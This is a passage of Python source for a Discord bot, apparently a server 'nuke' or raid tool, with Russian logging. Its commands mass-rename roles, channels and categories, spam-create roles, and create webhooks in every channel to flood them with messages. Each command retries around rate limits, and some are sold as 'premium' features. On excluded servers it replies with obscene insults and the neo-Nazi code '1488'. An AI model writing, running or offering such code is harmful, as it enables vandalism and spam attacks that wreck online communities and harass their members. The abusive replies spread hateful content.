    if guild.id in excluded_server_id:
        await ctx.send("Пошёл нахуй, тут 1488 ролей и без тебя хватает")
        console.print(f"[info]🔍 Команда rename_roles запрещена на сервере {guild.name} ({guild.id}) из excluded_server_ids[/]")
        return

    console.print(f"[action]🔧 Запуск команды !rename_roles для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id})[/]")

    try:
        roles = guild.roles
        count = 0
        failed_count = 0
        role_name = default_config.get("role_name")  

        async def rename_role(role):
            nonlocal count, failed_count
            try:
                async with limiter:
                    await role.edit(name=role_name)
                console.print(f"[success]✅ Роль {role.name} успешно переименована в {role_name}[/]")
                count += 1
            except discord.Forbidden:
                console.print(f"[error]❌ Нет разрешения на переименование роли {role.name}[/]")
                failed_count += 1
            except discord.HTTPException as e:
                if e.status == 429:
                    retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.5))
                    console.print(f"[warning]⏳ Rate limit при переименовании роли {role.name}, ждем {retry_after:.2f} секунд...[/]")
                    await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
                    async with limiter:
                        await role.edit(name=role_name)
                    console.print(f"[success]✅ Роль {role.name} переименована в {role_name} после повторной попытки[/]")
                    count += 1
                else:
                    console.print(f"[error]❌ Ошибка при переименовании роли {role.name}: {e}[/]")
                    failed_count += 1
            except Exception as e:
                console.print(f"[error]❌ Неизвестная ошибка при переименовании роли {role.name}: {e}[/]")
                failed_count += 1

        tasks = [rename_role(role) for role in roles if role != guild.default_role]
        await asyncio.gather(*tasks)
        await ctx.send(f"Renamed {count} roles to {role_name}! Failed to rename {failed_count} roles.")
        console.print(f"[success]✅ Переименовано {count} ролей в '{role_name}' на сервере {guild.name} ({guild.id})! Не удалось переименовать {failed_count} ролей[/]")

    except discord.Forbidden:
        await ctx.send("The bot does not have permission to rename roles.")
        console.print(f"[error]❌ Нет разрешения на переименование ролей на сервере {guild.name} ({guild.id})[/]")
    except Exception as e:
        await ctx.send("An error occurred while renaming roles.")
        console.print(f"[error]❌ Неизвестная ошибка при выполнении !rename_roles на сервере {guild.name} ({guild.id}): {e}[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def custom_rename_roles(ctx, *, message: str):
    guild = ctx.guild
    if guild.id in server_blacklist:
        await ctx.send("Команда custom_rename_roles запрещена на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда custom_rename_roles запрещена[/]")
        return

    if guild.id in excluded_server_id:
        await ctx.send("Соси мой большой член, долбаеб.")
        console.print(f"[info]🔍 Команда custom_rename_roles запрещена на сервере {guild.name} ({guild.id}) из excluded_server_ids[/]")
        return

    if ctx.author.id not in premium_users:
        embed = discord.Embed(description=":x: This command is only available to premium users.", color=0xff0000)
        await ctx.send(embed=embed)
        console.print(f"[error]❌ {ctx.author.name} ({ctx.author.id}) не премиум-пользователь, доступ к !custom_rename_roles запрещён[/]")
        return

    console.print(f"[action]🔧 Запуск команды !custom_rename_roles для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id}) с именем '{message}'[/]")

    try:
        roles = guild.roles
        count = 0
        failed_count = 0

        async def rename_role(role, number):
            nonlocal count, failed_count
            try:
                new_name = f"{message}"
                if len(new_name) > 100: 
                    new_name = new_name[:100]
                async with limiter:
                    await role.edit(name=new_name)
                console.print(f"[success]✅ Роль {role.name} успешно переименована в {new_name}[/]")
                count += 1
            except discord.Forbidden:
                console.print(f"[error]❌ Нет разрешения на переименование роли {role.name}[/]")
                failed_count += 1
            except discord.HTTPException as e:
                if e.status == 429:
                    retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.5))
                    console.print(f"[warning]⏳ Rate limit при переименовании роли {role.name}, ждем {retry_after:.2f} секунд...[/]")
                    await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
                    async with limiter:
                        await role.edit(name=new_name)
                    console.print(f"[success]✅ Роль {role.name} переименована в {new_name} после повторной попытки[/]")
                    count += 1
                else:
                    console.print(f"[error]❌ Ошибка при переименовании роли {role.name}: {e}[/]")
                    failed_count += 1
            except Exception as e:
                console.print(f"[error]❌ Неизвестная ошибка при переименовании роли {role.name}: {e}[/]")
                failed_count += 1

        tasks = [rename_role(role, i) for i, role in enumerate(roles, 1) if role != guild.default_role]
        await asyncio.gather(*tasks)
        await ctx.send(f"Renamed {count} roles to {message}! Failed to rename {failed_count} roles.")
        console.print(f"[success]✅ Переименовано {count} ролей в '{message}' на сервере {guild.name} ({guild.id})! Не удалось переименовать {failed_count} ролей[/]")

    except discord.Forbidden:
        await ctx.send("The bot does not have permission to rename roles.")
        console.print(f"[error]❌ Нет разрешения на переименование ролей на сервере {guild.name} ({guild.id})[/]")
    except Exception as e:
        await ctx.send("An error occurred while renaming roles.")
        console.print(f"[error]❌ Неизвестная ошибка при выполнении !custom_rename_roles на сервере {guild.name} ({guild.id}): {e}[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.guild)
async def rename_channels(ctx):
    guild = ctx.guild
    if guild.id in server_blacklist:
        await ctx.send("Команда rename_channels не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда rename_channels запрещена[/]")
        return

    if guild.id in excluded_server_id:
        await ctx.send("Маму твою ебал")
        console.print(f"[info]🔍 Команда rename_channels запрещена на сервере {guild.name} ({guild.id}) из excluded_server_ids[/]")
        return

    console.print(f"[action]🔧 Запуск команды !rename_channels для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id})[/]")

    success_count = 0
    failed_count = 0
    category_count = 1
    channel_count = 1
    tasks = []
    channel_name = default_config.get("channel_name") 

    def has_permissions(channel):
        permissions = channel.permissions_for(guild.me)
        return permissions.manage_channels

    async def rename_category(category):
        nonlocal success_count, failed_count, category_count
        try:
            async with limiter:
                await category.edit(name=f"{channel_name}-{category_count}")
            console.print(f"[success]✅ Категория '{category.name}' переименована в '{channel_name}-{category_count}'[/]")
            success_count += 1
            category_count += 1
        except discord.Forbidden:
            console.print(f"[error]❌ Нет прав для переименования категории '{category.name}'[/]")
            failed_count += 1
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.5))
                console.print(f"[warning]⏳ Rate limit при переименовании категории '{category.name}', ждем {retry_after:.2f} секунд...[/]")
                await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
                async with limiter:
                    await category.edit(name=f"{channel_name}-{category_count}")
                console.print(f"[success]✅ Категория '{category.name}' переименована в '{channel_name}-{category_count}' после повторной попытки[/]")
                success_count += 1
                category_count += 1
            else:
                console.print(f"[error]❌ Ошибка при переименовании категории '{category.name}': {e}[/]")
                failed_count += 1
        except Exception as e:
            console.print(f"[error]❌ Неизвестная ошибка при переименовании категории '{category.name}': {e}[/]")
            failed_count += 1

    async def rename_channel(channel):
        nonlocal success_count, failed_count, channel_count
        try:
            async with limiter:
                await channel.edit(name=f"{channel_name}")
            console.print(f"[success]✅ Канал '{channel.name}' переименован в '{channel_name}-{channel_count}'[/]")
            success_count += 1
            channel_count += 1
        except discord.Forbidden:
            console.print(f"[error]❌ Нет прав для переименования канала '{channel.name}'[/]")
            failed_count += 1
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.5))
                console.print(f"[warning]⏳ Rate limit при переименовании канала '{channel.name}', ждем {retry_after:.2f} секунд...[/]")
                await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
                async with limiter:
                    await channel.edit(name=f"{channel_name}-{channel_count}")
                console.print(f"[success]✅ Канал '{channel.name}' переименован в '{channel_name}-{channel_count}' после повторной попытки[/]")
                success_count += 1
                channel_count += 1
            else:
                console.print(f"[error]❌ Ошибка при переименовании канала '{channel.name}': {e}[/]")
                failed_count += 1
        except Exception as e:
            console.print(f"[error]❌ Неизвестная ошибка при переименовании канала '{channel.name}': {e}[/]")
            failed_count += 1

    for category in guild.categories:
        if has_permissions(category):
            tasks.append(rename_category(category))
        else:
            console.print(f"[error]❌ Нет прав для переименования категории '{category.name}'[/]")
            failed_count += 1

    for channel in guild.text_channels + guild.voice_channels:
        if has_permissions(channel):
            tasks.append(rename_channel(channel))
        else:
            console.print(f"[error]❌ Нет прав для переименования канала '{channel.name}'[/]")
            failed_count += 1

    await asyncio.gather(*tasks)

    final_message = f"Successfully renamed all {success_count} channels! Failed to rename {failed_count} channels."
    console.print(f"[success]✅ {final_message}[/]")
    
    if success_count > 0:
        await ctx.send(final_message)
    else:
        await ctx.send("The bot does not have sufficient rights to execute the command.")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.guild)
async def custom_rename_channels(ctx, *, message: str):
    guild = ctx.guild
    if guild.id in server_blacklist:
        await ctx.send("Команда custom_rename_channels не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда custom_rename_channels запрещена[/]")
        return

    if guild.id in excluded_server_id:
        await ctx.send("Еблан, кастомно свою улицу переименуй сначала.")
        console.print(f"[info]🔍 Команда custom_rename_channels запрещена на сервере {guild.name} ({guild.id}) из excluded_server_ids[/]")
        return

    if ctx.author.id not in premium_users:
        embed = discord.Embed(description=":x: This command is only available to premium users.", color=0xff0000)
        await ctx.send(embed=embed)
        console.print(f"[error]❌ {ctx.author.name} ({ctx.author.id}) не премиум-пользователь, доступ к !custom_rename_channels запрещён[/]")
        return

    console.print(f"[action]🔧 Запуск команды !custom_rename_channels для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id}) с именем '{message}'[/]")

    success_count = 0
    failed_count = 0
    category_count = 1
    channel_count = 1
    tasks = []

    def has_permissions(channel):
        permissions = channel.permissions_for(guild.me)
        return permissions.manage_channels

    async def rename_category(category):
        nonlocal success_count, failed_count, category_count
        try:
            new_name = f"{message}"
            if len(new_name) > 100: 
                new_name = new_name[:100]
            async with limiter:
                await category.edit(name=new_name)
            console.print(f"[success]✅ Категория '{category.name}' переименована в '{new_name}'[/]")
            success_count += 1
            category_count += 1
        except discord.Forbidden:
            console.print(f"[error]❌ Нет прав для переименования категории '{category.name}'[/]")
            failed_count += 1
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.5))
                console.print(f"[warning]⏳ Rate limit при переименовании категории '{category.name}', ждем {retry_after:.2f} секунд...[/]")
                await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
                async with limiter:
                    await category.edit(name=new_name)
                console.print(f"[success]✅ Категория '{category.name}' переименована в '{new_name}' после повторной попытки[/]")
                success_count += 1
                category_count += 1
            else:
                console.print(f"[error]❌ Ошибка при переименовании категории '{category.name}': {e}[/]")
                failed_count += 1
        except Exception as e:
            console.print(f"[error]❌ Неизвестная ошибка при переименовании категории '{category.name}': {e}[/]")
            failed_count += 1

    async def rename_channel(channel):
        nonlocal success_count, failed_count, channel_count
        try:
            new_name = f"{message}"
            if len(new_name) > 50:  
                new_name = new_name[:50]
            async with limiter:
                await channel.edit(name=new_name)
            console.print(f"[success]✅ Канал '{channel.name}' переименован в '{new_name}'[/]")
            success_count += 1
            channel_count += 1
        except discord.Forbidden:
            console.print(f"[error]❌ Нет прав для переименования канала '{channel.name}'[/]")
            failed_count += 1
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.5))
                console.print(f"[warning]⏳ Rate limit при переименовании канала '{channel.name}', ждем {retry_after:.2f} секунд...[/]")
                await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
                async with limiter:
                    await channel.edit(name=new_name)
                console.print(f"[success]✅ Канал '{channel.name}' переименован в '{new_name}' после повторной попытки[/]")
                success_count += 1
                channel_count += 1
            else:
                console.print(f"[error]❌ Ошибка при переименовании канала '{channel.name}': {e}[/]")
                failed_count += 1
        except Exception as e:
            console.print(f"[error]❌ Неизвестная ошибка при переименовании канала '{channel.name}': {e}[/]")
            failed_count += 1

    for category in guild.categories:
        if has_permissions(category):
            tasks.append(rename_category(category))
        else:
            console.print(f"[error]❌ Нет прав для переименования категории '{category.name}'[/]")
            failed_count += 1

    for channel in guild.text_channels + guild.voice_channels:
        if has_permissions(channel):
            tasks.append(rename_channel(channel))
        else:
            console.print(f"[error]❌ Нет прав для переименования канала '{channel.name}'[/]")
            failed_count += 1

    await asyncio.gather(*tasks)

    final_message = f"Successfully renamed all {success_count} channels! Failed to rename {failed_count} channels."
    console.print(f"[success]✅ {final_message}[/]")
    
    if success_count > 0:
        await ctx.send(final_message)
    else:
        await ctx.send("The bot does not have sufficient rights to execute the command.")

@bot.command()
@commands.cooldown(1, 180, commands.BucketType.guild)
async def spam_webhooks(ctx):
    guild = ctx.guild
    if guild.id in server_blacklist:
        await ctx.send("Команда spam_webhooks не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда spam_webhooks запрещена[/]")
        return

    if guild.id in excluded_server_id:
        await ctx.send("Маму твою ебал")
        console.print(f"[info]🔍 Команда spam_webhooks запрещена на сервере {guild.name} ({guild.id}) из excluded_server_ids[/]")
        return

    webhooks = await guild.webhooks()
    if not webhooks:
        await ctx.send("No webhooks on server.")
        console.print(f"[warning]⚠️ Нет вебхуков на сервере {guild.name} ({guild.id})[/]")
        return

    message = default_config.get("spam_message")
    spam_count = default_config.get("spam_count")
    success_count = 0
    failed_count = 0
    tasks = []

    console.print(f"[action]🔧 Запуск команды !spam_webhooks для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id})[/]")

    async def send_message(webhook):
        nonlocal success_count, failed_count
        try:
            async with limiter:
                await webhook.send(message)
            console.print(f"[success]✅ Сообщение отправлено через вебхук '{webhook.name}'[/]")
            success_count += 1
        except discord.Forbidden:
            console.print(f"[error]❌ Нет прав для отправки через вебхук '{webhook.name}'[/]")
            failed_count += 1
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.5))
                console.print(f"[warning]⏳ Rate limit при отправке через вебхук '{webhook.name}', ждем {retry_after:.2f} секунд...[/]")
                await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
                async with limiter:
                    await webhook.send(message)
                console.print(f"[success]✅ Сообщение отправлено через вебхук '{webhook.name}' после повторной попытки[/]")
                success_count += 1
            else:
                console.print(f"[error]❌ Ошибка при отправке через вебхук '{webhook.name}': {e}[/]")
                failed_count += 1
        except Exception as e:
            console.print(f"[error]❌ Неизвестная ошибка при отправке через вебхук '{webhook.name}': {e}[/]")
            failed_count += 1

    for webhook in webhooks:
        for _ in range(spam_count):
            tasks.append(send_message(webhook))

    await asyncio.gather(*tasks)

    final_message = f"Messages successfully sent via {success_count} webhooks! Failed to send via {failed_count} webhooks."
    console.print(f"[success]✅ {final_message}[/]")
    await ctx.send(final_message)

@bot.command()
@commands.cooldown(1, 180, commands.BucketType.guild)
async def webhooks(ctx):
    guild = ctx.guild
    if guild.id in server_blacklist:
        await ctx.send("Команда webhooks не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда webhooks запрещена[/]")
        return

    if guild.id in excluded_server_id:
        await ctx.send("Хуй те")
        console.print(f"[info]🔍 Команда webhooks запрещена на сервере {guild.name} ({guild.id}) из excluded_server_ids[/]")
        return

    message = default_config.get("spam_message")
    spam_count = default_config.get("spam_count")
    success_count = 0
    failed_count = 0
    tasks = []

    console.print(f"[action]🔧 Запуск команды !webhooks для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id})[/]")

    async def send_message(webhook, channel_name):
        nonlocal success_count, failed_count
        try:
            for _ in range(spam_count):
                async with limiter:
                    await webhook.send(message)
            console.print(f"[success]✅ Сообщения отправлены через вебхук '{webhook.name}' в канале '{channel_name}'[/]")
            success_count += 1
        except discord.Forbidden:
            console.print(f"[error]❌ Нет прав для отправки через вебхук '{webhook.name}' в канале '{channel_name}'[/]")
            failed_count += 1
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.5))
                console.print(f"[warning]⏳ Rate limit при отправке через вебхук '{webhook.name}' в канале '{channel_name}', ждем {retry_after:.2f} секунд...[/]")
                await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
                for _ in range(spam_count):
                    async with limiter:
                        await webhook.send(message)
                console.print(f"[success]✅ Сообщения отправлены через вебхук '{webhook.name}' в канале '{channel_name}' после повторной попытки[/]")
                success_count += 1
            else:
                console.print(f"[error]❌ Ошибка при отправке через вебхук '{webhook.name}' в канале '{channel_name}': {e}[/]")
                failed_count += 1
        except Exception as e:
            console.print(f"[error]❌ Неизвестная ошибка при отправке через вебхук '{webhook.name}' в канале '{channel_name}': {e}[/]")
            failed_count += 1

    async def create_and_send_webhook(channel):
        nonlocal failed_count
        try:
            permissions = channel.permissions_for(guild.me)
            if permissions.manage_webhooks:
                webhook = await channel.create_webhook(name=f"msc")
                console.print(f"[success]✅ Вебхук '{webhook.name}' создан в канале '{channel.name}'[/]")
                tasks.append(send_message(webhook, channel.name))
            else:
                console.print(f"[error]❌ Нет прав на управление вебхуками в канале '{channel.name}'[/]")
                failed_count += 1
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.5))
                console.print(f"[warning]⏳ Rate limit при создании вебхука в канале '{channel.name}', ждем {retry_after:.2f} секунд...[/]")
                await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
                webhook = await channel.create_webhook(name=f"ghs")
                console.print(f"[success]✅ Вебхук '{webhook.name}' создан в канале '{channel.name}' после повторной попытки[/]")
                tasks.append(send_message(webhook, channel.name))
            else:
                console.print(f"[error]❌ Ошибка при создании вебхука в канале '{channel.name}': {e}[/]")
                failed_count += 1
        except Exception as e:
            console.print(f"[error]❌ Неизвестная ошибка при создании вебхука в канале '{channel.name}': {e}[/]")
            failed_count += 1

    create_tasks = [create_and_send_webhook(channel) for channel in guild.text_channels if isinstance(channel, discord.TextChannel)]
    await asyncio.gather(*create_tasks)
    await asyncio.gather(*tasks)

    final_message = f"Messages successfully sent via {success_count} webhooks! Failed to send via {failed_count} webhooks."
    console.print(f"[success]✅ {final_message}[/]")
    await ctx.send(final_message)

@bot.command()
@commands.cooldown(1, 180, commands.BucketType.guild)
async def custom_webhooks(ctx, *, custom_message: str):
    guild = ctx.guild
    if guild.id in server_blacklist:
        await ctx.send("Команда custom_webhooks не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда custom_webhooks запрещена[/]")
        return

    if guild.id in excluded_server_id:
        await ctx.send("Мама говорила тебе, что у тебя член маленький")
        console.print(f"[info]🔍 Команда custom_webhooks запрещена на сервере {guild.name} ({guild.id}) из excluded_server_ids[/]")
        return

    if ctx.author.id not in premium_users:
        embed = discord.Embed(description=":x: This command is only available to premium users.", color=0xff0000)
        await ctx.send(embed=embed)
        console.print(f"[error]❌ {ctx.author.name} ({ctx.author.id}) не премиум-пользователь, доступ к !custom_webhooks запрещён[/]")
        return

    spam_count = default_config.get("spam_count")
    success_count = 0
    failed_count = 0
    tasks = []

    console.print(f"[action]🔧 Запуск команды !custom_webhooks для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id})[/]")

    async def send_message(webhook, channel_name):
        nonlocal success_count, failed_count
        try:
            for _ in range(spam_count):
                async with limiter:
                    await webhook.send(custom_message)
            console.print(f"[success]✅ Сообщения отправлены через вебхук '{webhook.name}' в канале '{channel_name}'[/]")
            success_count += 1
        except discord.Forbidden:
            console.print(f"[error]❌ Нет прав для отправки через вебхук '{webhook.name}' в канале '{channel_name}'[/]")
            failed_count += 1
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.5))
                console.print(f"[warning]⏳ Rate limit при отправке через вебхук '{webhook.name}' в канале '{channel_name}', ждем {retry_after:.2f} секунд...[/]")
                await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
                for _ in range(spam_count):
                    async with limiter:
                        await webhook.send(custom_message)
                console.print(f"[success]✅ Сообщения отправлены через вебхук '{webhook.name}' в канале '{channel_name}' после повторной попытки[/]")
                success_count += 1
            else:
                console.print(f"[error]❌ Ошибка при отправке через вебхук '{webhook.name}' в канале '{channel_name}': {e}[/]")
                failed_count += 1
        except Exception as e:
            console.print(f"[error]❌ Неизвестная ошибка при отправке через вебхук '{webhook.name}' в канале '{channel_name}': {e}[/]")
            failed_count += 1

    async def create_and_send_webhook(channel):
        nonlocal failed_count
        try:
            permissions = channel.permissions_for(guild.me)
            if permissions.manage_webhooks:
                webhook = await channel.create_webhook(name=f"msc")
                console.print(f"[success]✅ Вебхук '{webhook.name}' создан в канале '{channel.name}'[/]")
                tasks.append(send_message(webhook, channel.name))
            else:
                console.print(f"[error]❌ Нет прав на управление вебхуками в канале '{channel.name}'[/]")
                failed_count += 1
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.5))
                console.print(f"[warning]⏳ Rate limit при создании вебхука в канале '{channel.name}', ждем {retry_after:.2f} секунд...[/]")
                await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
                webhook = await channel.create_webhook(name=f"ghs-{channel.name}")
                console.print(f"[success]✅ Вебхук '{webhook.name}' создан в канале '{channel.name}' после повторной попытки[/]")
                tasks.append(send_message(webhook, channel.name))
            else:
                console.print(f"[error]❌ Ошибка при создании вебхука в канале '{channel.name}': {e}[/]")
                failed_count += 1
        except Exception as e:
            console.print(f"[error]❌ Неизвестная ошибка при создании вебхука в канале '{channel.name}': {e}[/]")
            failed_count += 1

    create_tasks = [create_and_send_webhook(channel) for channel in guild.text_channels if isinstance(channel, discord.TextChannel)]
    await asyncio.gather(*create_tasks)
    await asyncio.gather(*tasks)

    final_message = f"Messages successfully sent via {success_count} webhooks! Failed to send via {failed_count} webhooks."
    console.print(f"[success]✅ {final_message}[/]")
    await ctx.send(final_message)

@bot.command()
@commands.cooldown(1, 180, commands.BucketType.guild)
async def custom_spam_webhooks(ctx, *, message: str):
    guild = ctx.guild
    if guild.id in server_blacklist:
        await ctx.send("Команда custom_spam_webhooks не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда custom_spam_webhooks запрещена[/]")
        return

    if guild.id in excluded_server_id:
        await ctx.send("Жди, кокс, я выложу тебя на коксбин")
        console.print(f"[info]🔍 Команда custom_spam_webhooks запрещена на сервере {guild.name} ({guild.id}) из excluded_server_ids[/]")
        return

    if ctx.author.id not in premium_users:
        embed = discord.Embed(description=":x: This command is only available to premium users.", color=0xff0000)
        await ctx.send(embed=embed)
        console.print(f"[error]❌ {ctx.author.name} ({ctx.author.id}) не премиум-пользователь, доступ к !custom_spam_webhooks запрещён[/]")
        return

    webhooks = await guild.webhooks()
    if not webhooks:
        await ctx.send("No webhooks on server.")
        console.print(f"[warning]⚠️ Нет вебхуков на сервере {guild.name} ({guild.id})[/]")
        return

    spam_count = default_config.get("spam_count")
    success_count = 0
    failed_count = 0
    tasks = []

    async def send_message(webhook):
        nonlocal success_count, failed_count
        try:
            async with limiter:
                await webhook.send(message)
            console.print(f"[success]✅ Сообщение отправлено через вебхук '{webhook.name}'[/]")
            success_count += 1
        except discord.Forbidden:
            console.print(f"[error]❌ Нет прав для отправки через вебхук '{webhook.name}'[/]")
            failed_count += 1
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.5))
                console.print(f"[warning]⏳ Rate limit при отправке через вебхук '{webhook.name}', ждем {retry_after:.2f} секунд...[/]")
                await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
                async with limiter:
                    await webhook.send(message)
                console.print(f"[success]✅ Сообщение отправлено через вебхук '{webhook.name}' после повторной попытки[/]")
                success_count += 1
            else:
                console.print(f"[error]❌ Ошибка при отправке через вебхук '{webhook.name}': {e}[/]")
                failed_count += 1
        except Exception as e:
            console.print(f"[error]❌ Неизвестная ошибка при отправке через вебхук '{webhook.name}': {e}[/]")
            failed_count += 1

    for webhook in webhooks:
        for _ in range(spam_count):
            tasks.append(send_message(webhook))

    await asyncio.gather(*tasks)

    final_message = f"Messages successfully sent via {success_count} webhooks! Failed to send via {failed_count} webhooks."
    console.print(f"[success]✅ {final_message}[/]")
    await ctx.send(final_message)

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def spamrole(ctx):
    guild = ctx.guild
    if guild.id in server_blacklist:
        await ctx.send("Команда spamrole не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда spamrole запрещена[/]")
        return

    if guild.id in excluded_server_id:
        await ctx.send("Пошёл нахуй, папе своему роль сделай в дискорде")
        console.print(f"[info]🔍 Команда spamrole запрещена на сервере {guild.name} ({guild.id}) из excluded_server_ids[/]")
        return

    console.print(f"[action]🔧 Запуск команды !spamrole для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id})[/]")

    try:
        role_name = default_config.get("role_name")  
        num_roles = default_config.get("num_roles")  
        colors = [discord.Color.random() for _ in range(num_roles)]
        success_count = 0
        failed_count = 0

        async def create_role(color, number):
            nonlocal success_count, failed_count
            try:
                async with limiter:
                    await guild.create_role(name=f"{role_name}", color=color)
                console.print(f"[success]✅ Роль '{role_name}' успешно создана[/]")
                success_count += 1
            except discord.Forbidden:
                console.print(f"[error]❌ Нет разрешения на создание роли '{role_name}'[/]")
                failed_count += 1
            except discord.HTTPException as e:
                if e.status == 429:
                    retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.5))
                    console.print(f"[warning]⏳ Rate limit при создании роли '{role_name}', ждем {retry_after:.2f} секунд...[/]")
                    await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
                    async with limiter:
                        await guild.create_role(name=f"{role_name}", color=color)
                    console.print(f"[success]✅ Роль '{role_name}' создана после повторной попытки[/]")
                    success_count += 1
                else:
                    console.print(f"[error]❌ Ошибка при создании роли '{role_name}': {e}[/]")
                    failed_count += 1
            except Exception as e:
                console.print(f"[error]❌ Неизвестная ошибка при создании роли '{role_name}': {e}[/]")
                failed_count += 1

        tasks = [create_role(color, i) for i, color in enumerate(colors, 1)]
        await asyncio.gather(*tasks)
        await ctx.send(f"{success_count} roles created! Failed to create {failed_count} roles.")
        console.print(f"[success]✅ Создано {success_count} ролей на сервере {guild.name} ({guild.id})! Не удалось создать {failed_count} ролей[/]")

    except discord.Forbidden:
        await ctx.send("The bot does not have permission to create roles.")
        console.print(f"[error]❌ Нет разрешения на создание ролей на сервере {guild.name} ({guild.id})[/]")
    except Exception as e:
        await ctx.send("An error occurred while creating roles.")
        console.print(f"[error]❌ Неизвестная ошибка при выполнении !spamrole на сервере {guild.name} ({guild.id}): {e}[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def custom_role(ctx, *, arg: str):
    guild = ctx.guild
    if guild.id in server_blacklist:
        await ctx.send("Команда custom_role не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда custom_role запрещена[/]")
        return

    if guild.id in excluded_server_id:
        await ctx.send("Пошёл нахуй, тут 1488 ролей и без тебя хватает")
        console.print(f"[info]🔍 Команда custom_role запрещена на сервере {guild.name} ({guild.id}) из excluded_server_ids[/]")
        return

    if ctx.author.id not in premium_users:
        embed = discord.Embed(description=":x: This command is only available to premium users.", color=0xff0000)
        await ctx.send(embed=embed)
        console.print(f"[error]❌ {ctx.author.name} ({ctx.author.id}) не премиум-пользователь, доступ к !custom_role запрещён[/]")
        return

    console.print(f"[action]🔧 Запуск команды !custom_role для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id}) с именем '{arg}'[/]")

    try:
        num_roles = default_config.get("num_roles") 
        colors = [discord.Color.random() for _ in range(num_roles)]
        success_count = 0
        failed_count = 0

        async def create_role(color):
            nonlocal success_count, failed_count
            try:
                name = arg[:100]  
                async with limiter:
                    await guild.create_role(name=name, color=color)
                console.print(f"[success]✅ Роль '{name}' успешно создана[/]")
                success_count += 1
            except discord.Forbidden:
                console.print(f"[error]❌ Нет разрешения на создание роли '{name}'[/]")
                failed_count += 1
            except discord.HTTPException as e:
                if e.status == 429:
                    retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.5))
                    console.print(f"[warning]⏳ Rate limit при создании роли '{name}', ждем {retry_after:.2f} секунд...[/]")
                    await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
                    async with limiter:
                        await guild.create_role(name=name, color=color)
                    console.print(f"[success]✅ Роль '{name}' создана после повторной попытки[/]")
                    success_count += 1
                else:
                    console.print(f"[error]❌ Ошибка при создании роли '{name}': {e}[/]")
                    failed_count += 1
            except Exception as e:
                console.print(f"[error]❌ Неизвестная ошибка при создании роли '{name}': {e}[/]")
                failed_count += 1

        tasks = [create_role(color) for color in colors]
        await asyncio.gather(*tasks)
        await ctx.send(f"{success_count} roles created! Failed to create {failed_count} roles.")
        console.print(f"[success]✅ Создано {success_count} ролей на сервере {guild.name} ({guild.id})! Не удалось создать {failed_count} ролей[/]")

    except discord.Forbidden:
        await ctx.send("The bot does not have permission to create roles.")
        console.print(f"[error]❌ Нет разрешения на создание ролей на сервере {guild.name} ({guild.id})[/]")
    except Exception as e:
        await ctx.send("An error occurred while creating roles.")
        console.print(f"[error]❌ Неизвестная ошибка при выполнении !custom_role на сервере {guild.name} ({guild.id}): {e}[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def close_server(ctx):
    guild = ctx.guild
